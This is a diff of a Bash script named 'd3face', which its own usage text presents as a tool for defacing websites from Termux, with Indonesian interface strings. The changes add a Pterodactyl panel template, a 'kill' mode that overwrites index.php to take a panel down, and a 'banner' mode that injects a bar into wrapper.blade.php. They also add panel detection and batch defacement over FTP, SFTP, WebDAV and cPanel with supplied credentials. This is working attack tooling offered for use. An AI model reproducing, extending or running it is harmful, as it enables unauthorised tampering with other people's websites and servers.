+  list=$(ls -1t "$BKD" 2>/dev/null | grep -v '\.meta$' | head -20)
   [ -z "$list" ] && { warn "belum ada backup"; return; }
   printf '%s\n' "$list" | nl -w2 -s'. '
   n=$(ask "nomor")
   f=$(printf '%s\n' "$list" | sed -n "${n}p")
   [ -z "$f" ] && { bad "nomor tidak ada"; return; }
 
-  host=${f%%_*}
-  host=$(ask "domain konfirmasi" "$host")
+  path=""
+  [ -f "$BKD/$f.meta" ] && path=$(sed -n 's/^path=//p' "$BKD/$f.meta")
+  [ -z "$path" ] && path="${PATH_DIR%/}/$(printf '%s' "$f" | sed 's/^[0-9]*_//' | tr '_' '/')"
+
+  host=$(ask "domain")
   sch=$(ask "skema (http/https)" "https")
   u=$(ask "username"); w=$(ask "password")
   m=$(ask "metode (ftp/sftp/webdav)" "ftp")
   case $m in ftp) port=21 ;; sftp) port=22 ;; *) port=443 ;; esac
-  path="${PATH_DIR%/}/${f##*_}"
 
-  [ -z "$u" ] && { bad "username wajib"; return; }
-  [ -z "$w" ] && { bad "password wajib"; return; }
+  [ -z "$host" ] && { bad "domain wajib"; return; }
+  [ -z "$u" ] || [ -z "$w" ] && { bad "kredensial wajib"; return; }
   askyn "timpa $sch://$host$path ?" || return
 
   spin_start "mengirim backup"
   upload "$m" "$host" "$port" "$sch" "$path" "$u" "$w" "$BKD/$f"; rc=$?
   spin_stop
   if [ "$rc" = 0 ]; then ok "restore terkirim"
-  else bad "restore: $(explain "$rc")${ERRMSG:+ — ${ERRMSG%%$'\n'*}}"; fi
+  else bad "restore: $(explain "$rc")${UPHTTP:+ [HTTP $UPHTTP]}"; fi
 }
 
 preview() {
   clear 2>/dev/null
   banner
-  printf '%s\n\n' "${M}  PRATINJAU TEMPLATE${R}"
+  printf '%s\n\n' "${M}  PRATINJAU${R}"
   local tpl alias msg f
-  tpl=$(ask "template (1-4)" "$TPL")
+  tpl=$(ask "template (1-5)" "$TPL")
   alias=$(ask "alias" "$ALIAS")
   msg=$(ask "pesan" "$MSG")
-  case $tpl in 1|2|3|4) ;; *) tpl=1 ;; esac
+  case $tpl in 1|2|3|4|5) ;; *) tpl=1 ;; esac
   f=$(mktemp "${TMPDIR:-/tmp}/d3face.XXXXXX") || return
   TMPFILES+=("$f")
-  gen_page "$tpl" "$alias" "$msg" "contoh.test" "MARKER" >"$f"
-  echo; hr
-  sed -e 's/</\n</g' "$f" | head -40
-  hr
-  info "file: $f"
-  askyn "jadikan template default?" "n" && { TPL=$tpl; save; ok "template default: $(tname "$tpl")"; }
+  if [ "$tpl" = 5 ]; then ptero_snippet "$alias" "$msg" "contoh.test" "MARKER" >"$f"
+  else gen_page "$tpl" "$alias" "$msg" "contoh.test" "MARKER" >"$f"; fi
+  hr; sed -e 's/</\n</g' "$f" | head -45; hr
+  askyn "jadikan template default?" "n" && { TPL=$tpl; save; ok "template: $(tname "$tpl")"; }
 }
 
 setting() {
@@ -553,15 +733,17 @@ setting() {
   PATH_DIR=$(ask "folder default" "$PATH_DIR")
   METHOD=$(ask "metode default" "$METHOD")
   TPL=$(ask "template default" "$TPL")
-  case $TPL in 1|2|3|4) ;; *) TPL=1 ;; esac
-  save && ok "disimpan ke $CONF"
+  MODE=$(ask "mode (auto/kill/banner)" "$MODE")
+  case $TPL in 1|2|3|4|5) ;; *) TPL=1 ;; esac
+  case $MODE in auto|kill|banner) ;; *) MODE=auto ;; esac
+  save && ok "disimpan"
 }
 
 usage() {
   cat <<EOF
 d3face $V — deface website dari Termux
 
-  d3face                      menu interaktif
+  d3face                      menu
   d3face -d DOMAIN [opsi]     langsung jalan
 
 opsi:
@@ -569,46 +751,55 @@ opsi:
   -m, --method M        auto|ftp|sftp|webdav|put|cpanel
   -u, --user USER       username
   -p, --pass PASS       password
-  -P, --path DIR        folder tujuan
+  -P, --path DIR        folder tujuan / webroot
   -s, --scheme S        http|https
       --port N          port manual
-  -t, --tpl N           template 1-4
+  -t, --tpl N           template 1-5
   -a, --alias NAME      alias
-  -l, --list FILE       batch dari file
-  -n, --dry-run         siapkan saja, tanpa upload
+      --mode M          auto|kill|banner
+      --panel P         auto|pterodactyl|laravel|generic
+  -l, --list FILE       batch
+  -n, --dry-run         tanpa upload
   -y, --yes             tanpa konfirmasi
   -V, --version         versi
   -h, --help            bantuan
+
+mode:
+  kill     timpa index.php, panel mati
+  banner   sisipkan bilah ke wrapper.blade.php, panel tetap hidup
+  auto     banner untuk panel, kill untuk situs biasa
 EOF
 }
 
 main() {
   while [ $# -gt 0 ]; do
     case $1 in
-      -d|--domain) [ $# -ge 2 ] || die "opsi $1 butuh nilai"; HOST=$2; shift 2 ;;
-      -m|--method) [ $# -ge 2 ] || die "opsi $1 butuh nilai"; D_METHOD=$2; shift 2 ;;
-      -u|--user)   [ $# -ge 2 ] || die "opsi $1 butuh nilai"; D_USER=$2; shift 2 ;;
-      -p|--pass)   [ $# -ge 2 ] || die "opsi $1 butuh nilai"; D_PASS=$2; shift 2 ;;
-      -P|--path)   [ $# -ge 2 ] || die "opsi $1 butuh nilai"; CLI_PATH=$2; shift 2 ;;
-      -s|--scheme) [ $# -ge 2 ] || die "opsi $1 butuh nilai"; SCHEME=$2; shift 2 ;;
-      --port)      [ $# -ge 2 ] || die "opsi $1 butuh nilai"; D_PORT=$2; shift 2 ;;
-      -t|--tpl)    [ $# -ge 2 ] || die "opsi $1 butuh nilai"; CLI_TPL=$2; shift 2 ;;
-      -a|--alias)  [ $# -ge 2 ] || die "opsi $1 butuh nilai"; CLI_ALIAS=$2; shift 2 ;;
-      -l|--list)   [ $# -ge 2 ] || die "opsi $1 butuh nilai"; BATCHF=$2; shift 2 ;;
+      -d|--domain)  [ $# -ge 2 ] || die "opsi $1 butuh nilai"; HOST=$2; shift 2 ;;
+      -m|--method)  [ $# -ge 2 ] || die "opsi $1 butuh nilai"; D_METHOD=$2; shift 2 ;;
+      -u|--user)    [ $# -ge 2 ] || die "opsi $1 butuh nilai"; D_USER=$2; shift 2 ;;
+      -p|--pass)    [ $# -ge 2 ] || die "opsi $1 butuh nilai"; D_PASS=$2; shift 2 ;;
+      -P|--path)    [ $# -ge 2 ] || die "opsi $1 butuh nilai"; CLI_PATH=$2; shift 2 ;;
+      -s|--scheme)  [ $# -ge 2 ] || die "opsi $1 butuh nilai"; SCHEME=$2; shift 2 ;;
+      --port)       [ $# -ge 2 ] || die "opsi $1 butuh nilai"; D_PORT=$2; shift 2 ;;
+      -t|--tpl)     [ $# -ge 2 ] || die "opsi $1 butuh nilai"; CLI_TPL=$2; shift 2 ;;
+      -a|--alias)   [ $# -ge 2 ] || die "opsi $1 butuh nilai"; CLI_ALIAS=$2; shift 2 ;;
+      --mode)       [ $# -ge 2 ] || die "opsi $1 butuh nilai"; MODE=$2; shift 2 ;;
+      --panel)      [ $# -ge 2 ] || die "opsi $1 butuh nilai"; PANEL=$2; shift 2 ;;
+      -l|--list)    [ $# -ge 2 ] || die "opsi $1 butuh nilai"; BATCHF=$2; shift 2 ;;
       -n|--dry-run) DRY=1; shift ;;
-      -y|--yes)    YES=1; shift ;;
+      -y|--yes)     YES=1; shift ;;
       -V|--version) printf 'd3face %s\n' "$V"; exit 0 ;;
-      -h|--help)   usage; exit 0 ;;
+      -h|--help)    usage; exit 0 ;;
       *) warn "opsi tak dikenal: $1"; shift ;;
     esac
   done
 
   init
-
-  # argumen CLI menang atas config
   [ -n "$CLI_TPL" ]   && TPL=$CLI_TPL
   [ -n "$CLI_ALIAS" ] && ALIAS=$CLI_ALIAS
   [ -n "$CLI_PATH" ]  && PATH_DIR=$CLI_PATH
+  case $MODE in auto|kill|banner|"") ;; *) die "mode tidak dikenal: $MODE" ;; esac
+  case $PANEL in auto|pterodactyl|laravel|generic|"") ;; *) die "panel tidak dikenal: $PANEL" ;; esac
 
   [ -n "$BATCHF" ] && { batch "$BATCHF"; exit $?; }
   if [ -n "$HOST" ]; then do_deface "$HOST"; exit $?; fi
